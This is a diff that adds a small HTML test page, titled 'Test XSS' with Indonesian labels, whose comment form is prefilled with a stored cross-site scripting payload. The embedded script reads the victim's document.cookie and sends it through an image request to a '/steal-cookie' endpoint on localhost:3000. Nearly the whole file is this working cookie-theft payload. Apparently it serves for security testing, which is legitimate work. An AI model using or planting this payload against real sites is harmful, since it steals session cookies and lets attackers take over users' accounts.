@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Test XSS</title>
+</head>
+<body>
+  <h1>Test XSS</h1>
+  <form action="/submit" method="POST">
+    <label for="comment">Komentar:</label>
+    <textarea id="comment" name="comment" rows="4" cols="50">
+      <script>
+        var cookies = document.cookie;
+        if (cookies) {
+          var img = new Image();
+          img.src = "http://localhost:3000/steal-cookie?cookie=" + encodeURIComponent(cookies);
+          document.body.appendChild(img);
+        }
+      </script>      
+      
+      </textarea>
+      
+    <button type="submit">Kirim</button>
+  </form>
+</body>
+</html>
